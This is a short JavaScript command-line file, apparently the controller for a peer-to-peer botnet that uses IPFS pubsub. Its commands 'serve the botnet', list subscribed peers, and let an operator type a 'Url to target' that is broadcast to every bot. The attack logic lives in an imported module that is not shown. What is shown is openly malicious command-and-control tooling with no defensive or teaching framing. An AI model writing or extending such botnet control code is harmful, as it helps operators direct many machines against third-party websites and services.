// TODO: Call pbLogic with the topic.
import args from 'args';
import pbL, { list_peers, send_next_target } from './pbLogic';
const TOPIC = 'btnt-ipfs';
import readline from 'readline';
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});
console.log(TOPIC);

const serveCommand = async () => {
  await pbL(TOPIC);
};

const adminCommand = async () => {
  rl.question('Url to target: ', async (url) => {
    await send_next_target(TOPIC, url);
  });
};
const listPeers = async () => {
  await list_peers(TOPIC);
};

args
  .command('serve', 'Serve the botnet', serveCommand)
  .command('admin', 'Send messages to the pubsub botnet', adminCommand)
  .command('peers', 'List the peers that are subscribed to the topic', listPeers);

// Parse cli args 
args.parse(process.argv);


